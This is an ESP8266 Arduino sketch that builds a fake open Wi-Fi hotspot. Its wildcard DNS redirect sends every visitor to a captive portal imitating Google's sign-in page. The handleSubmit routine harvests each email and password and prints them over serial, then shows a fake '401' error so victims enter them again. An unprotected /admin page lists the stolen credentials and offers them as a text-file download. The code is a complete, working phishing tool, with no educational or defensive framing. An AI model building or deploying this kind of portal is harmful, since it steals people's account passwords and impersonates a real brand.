#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

// Network configuration
const char *ssid = "Free WiFi Hotspot";
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
const byte DNS_PORT = 53;

// Create instances of the server and DNS server
ESP8266WebServer webServer(80);
DNSServer dnsServer;

// Variable to store credentials
String credentials = "";

void setup() {
  // Start the serial communication at 9600 baud
  Serial.begin(9600);

  // Set up the ESP8266 as an open access point
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);

  Serial.println("Access Point Created");
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Start DNS server to redirect all domains to the local IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Define the root URL and the handling function
  webServer.on("/", handleRoot);

  // Define the form submission URL and the handling function
  webServer.on("/submit", HTTP_POST, handleSubmit);

  // Define the admin panel URL and the handling function
  webServer.on("/admin", handleAdmin);

  // Redirect all other URLs to the captive portal page
  webServer.onNotFound(handleRoot);

  // Start the web server
  webServer.begin();
  Serial.println("Web Server Started");
}

void loop() {
  // Handle incoming client requests and DNS queries
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  // HTML content for the captive portal page
  String page = "<!DOCTYPE html><html lang='en'><head><title>Free WiFi</title><meta charset='UTF-8'>";
  page += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  page += "<style>body {font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; min-height: 100vh;";
  page += "align-items: center; justify-content: center; background-color: #f1f1f1;} .head {font-size: 24px;";
  page += "padding: 15px; text-align: center; box-shadow: 0px 2px 4px rgba(255, 255, 255, 0.1); margin-right: 20px;";
  page += "margin-left: 20px;} .container {background-color: #fff; padding: 15px; border-radius: 20px; text-align: center;";
  page += "box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1); margin-right: 20px; margin-left: 20px;} .title {font-size: 24px;";
  page += "margin-bottom: 20px;} .input-container {margin-bottom: 15px;} .input-container label {display: block;";
  page += "margin-bottom: 5px;} .input-container input {padding: 10px; border: 1px solid #ddd; border-radius: 4px;";
  page += "width: 90%;} .button {display: block; padding: 10px 20px; background-color: #007bff; color: #fff;";
  page += "border: none; border-radius: 4px; cursor: pointer; text-align: right; margin-left: 20px;} .other-link {";
  page += "font-size: 12px; margin-top: 10px; color: #aaa;} .other-link a {text-decoration: none; color: #aaa;}";
  page += "</style></head><body><div class='head'><h1>Free <font color='#4681f3'>W</font><font color='#de302e'>i</font>";
  page += "<font color='#f6c300'>F</font><font color='#4681f3'>i</font></h1><br><br><div class='container'>";
  page += "<h1><font color='#4681f3'>G</font><font color='#de302e'>o</font><font color='#f6c300'>o</font><font color='#4681f3'>g</font>";
  page += "<font color='#37bc50'>l</font><font color='#de302e'>e</font></h1><h1 class='title'>Sign in</h1>";
  page += "<form id='loginForm' action='/submit' method='POST'>";
  page += "<div class='input-container'><input type='email' id='username' name='username' placeholder='Email Address'>";
  page += "<br><br><input type='password' id='password' name='password' placeholder='Account Password'></div>";
  page += "<button type='submit' class='button'>Sign in</button></form><div class='other-link'>";
  page += "<a href='#'>Google is not responsible for any leaked or stolen information. It is up to the client to use our services.</a>";
  page += "<br><a>By using Google Auth you agree to Google's Terms and Conditions</a></div></div></div></body></html>";

  // Send the HTML content to the client
  webServer.send(200, "text/html", page);
}

void handleSubmit() {
  // Retrieve the form input values
  String username = webServer.arg("username");
  String password = webServer.arg("password");

  // Store the input values in the credentials variable
  credentials += "Username: " + username + ", Password: " + password + " __nxtUsr__ ";

  // Send the input values over serial
  Serial.print("Username: ");
  Serial.println(username);
  Serial.print("Password: ");
  Serial.println(password);

  // Send a response back to the client
  String response = "<html><body>";
  response += "<p>(401) There was an error while verifing your account.</p>";
  response += "<p>Try a different email or password.</p>";
  response += "<a href='/'>Try Again</a>";
  response += "</body></html>";

  // Send the HTML response to the client
  webServer.send(200, "text/html", response);
}

void handleAdmin() {
  // HTML content for the admin panel
  String page = "<!DOCTYPE html><html lang='en'><head><title>Admin Panel</title><meta charset='UTF-8'>";
  page += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  page += "<style>body {margin: 0; padding: 20px; font-family: Arial, sans-serif; background-color: #222; color: #fff;}";
  page += "h2 {text-align: center;} .credentials {background-color: #333; padding: 10px; border-radius: 10px;}";
  page += "</style></head><body><h2>Admin Panel</h2>";
  page += "<div class='credentials'>" + credentials + "</div>";
  page += "<textarea id='textArea' style='background-color: #2e2e2e; color: #ffffff; width: 100%; height: 50vh;'>" + credentials + "</textarea><button id='btnSave' style='background-color: #444; color: #ffffff; border: none; padding: 10px 20px; cursor: pointer;'>Save List as .txt</button><script>document.getElementById('btnSave').addEventListener('click', () => {const txt = document.getElementById('textArea').value;const blob = new Blob([txt], {type: 'text/plain'});const url = URL.createObjectURL(blob);const ele = document.createElement('a');ele.href = url;ele.download = 'credentials.txt';ele.click();setTimeout(() => URL.revokeObjectURL(url), 1000);});</script>";
  page += "</body></html>";

  // Send the HTML content to the client
  webServer.send(200, "text/html", page);
}
